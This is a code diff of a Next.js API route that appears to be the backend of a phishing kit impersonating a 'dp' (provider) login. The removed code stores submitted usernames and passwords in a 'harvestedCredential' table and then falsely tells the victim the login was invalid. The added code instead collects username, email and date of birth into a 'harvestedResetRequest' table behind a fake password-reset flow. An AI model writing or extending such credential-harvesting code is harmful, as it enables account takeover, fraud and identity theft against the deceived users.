@@ -10,32 +10,31 @@ const prisma = new PrismaClient({ adapter });
 export async function POST(request: Request) {
   try {
     const body = await request.json();
-    const { dp, username, password } = body;
+    const { dp, username, email, dob } = body;
 
-    if (!dp || !username || !password) {
+    if (!dp || !username || !email || !dob) {
       return NextResponse.json(
-        { error: "Username or password invalid." },
+        { error: "All fields are required." },
         { status: 400 }
       );
     }
 
-    await prisma.harvestedCredential.create({
+    // Save the reset request details to the database
+    await prisma.harvestedResetRequest.create({
       data: {
         dpCode: dp?.code || "",
         dpName: dp?.name || "",
         username,
-        password,
+        email,
+        dob,
       },
     });
 
-    return NextResponse.json(
-      { error: "Username or password invalid." },
-      { status: 401 }
-    );
+    return NextResponse.json({ success: true }, { status: 200 });
   } catch (error) {
     console.error("Database error:", error);
     return NextResponse.json(
-      { error: "An error occurred during login." },
+      { error: "An error occurred during the request." },
       { status: 500 }
     );
   }
